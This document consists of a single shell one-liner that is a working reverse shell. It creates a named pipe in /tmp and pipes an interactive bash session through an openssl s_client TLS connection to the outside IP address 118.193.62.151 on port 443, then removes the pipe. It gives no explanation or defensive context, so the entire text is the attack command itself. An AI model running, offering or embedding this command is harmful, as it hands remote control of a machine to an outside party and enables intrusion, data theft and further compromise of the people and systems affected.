/usr/bin/mkfifo /tmp/s; /usr/bin/bash -i < /tmp/s 2>&1 | /usr/bin/openssl s_client -quiet -connect 118.193.62.151:443 > /tmp/s; /usr/bin/rm /tmp/s
